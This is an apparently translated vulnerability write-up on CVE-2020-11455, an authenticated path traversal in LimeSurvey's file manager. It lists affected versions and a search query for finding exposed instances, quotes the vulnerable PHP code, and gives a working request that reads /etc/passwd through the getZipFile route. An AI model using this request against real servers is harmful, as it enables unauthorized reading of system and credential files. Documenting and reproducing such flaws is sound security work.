# LimeSurvey LimeSurveyFileManager.php A random file reading vulnerability in the background CVE-2020-11455

## Vulnerability Description

LimeSurvey (formerly known as PHPSurveyor) is an open source online questionnaire program of the LimeSurvey team. It supports the development of survey program, questionnaire release and data collection functions.
LimeSurvey 4.1.12 + There is a path traversal vulnerability in the application/controllers/admin/LimeSurveyFileManager.php file in versions prior to 200324. 

## Vulnerability Impact

LimeSurvey < 4.1.12 + 200324</span>

## Network surveying and mapping

app="LimeSurvey"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1650453876458-96aaea24-21f4-4ffb-9339-c596d9c4fc87.png)

The file with the vulnerability is `application/controllers/admin/LimeSurveyFileManager.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1650453992802-1393b9ad-1a7f-41ba-b80c-5f2058c4bfc7-20220420194636996.png)

```php {14-19}
public function downloadFiles() {
        App()->loadLibrary('admin.pclzip');
        
        $folder = basename(Yii::app()->request->getPost('folder', 'global'));
        $files = Yii::app()->request->getPost('files');

        $tempdir = Yii::app()->getConfig('tempdir');
        $randomizedFileName = $folder.'_'.substr(md5(time()),3,13).'.zip';
        $zipfile = $tempdir.DIRECTORY_SEPARATOR.$randomizedFileName;
        $arrayOfFiles = array_map( function($file){ return $file['path']; }, $files);
        $archive = new PclZip($zipfile);
        $checkFileCreate = $archive->create($arrayOfFiles, PCLZIP_OPT_REMOVE_ALL_PATH);
        $urlFormat = Yii::app()->getUrlManager()->getUrlFormat();
        $getFileLink = Yii::app()->createUrl('admin/filemanager/sa/getZipFile');
        if($urlFormat == 'path') {
            $getFileLink .= '?path='.$zipfile;
        } else {
            $getFileLink .= '&path='.$zipfile;
        }

        $this->_printJsonResponse(
            [
                'success' => true,
                'message' => sprintf(gT("Files are ready for download in archive %s."), $randomizedFileName),
                'downloadLink' => $getFileLink ,
            ]
        );
    }
```

The route is: `admin/filemanager/sa/getZipFile`, here pass the parameter path into the method `getZipFile()`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1650454603065-aa5fbb1b-b8bb-4a45-ad2f-c86dd87ce2f5-20220420194643953.png)

Here, the file is read by the readfile method, and the request is sent after logging in to the background.

```php
/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1650454764306-b899ea3a-16f0-4fdb-b4a1-80df09dd17e4.png)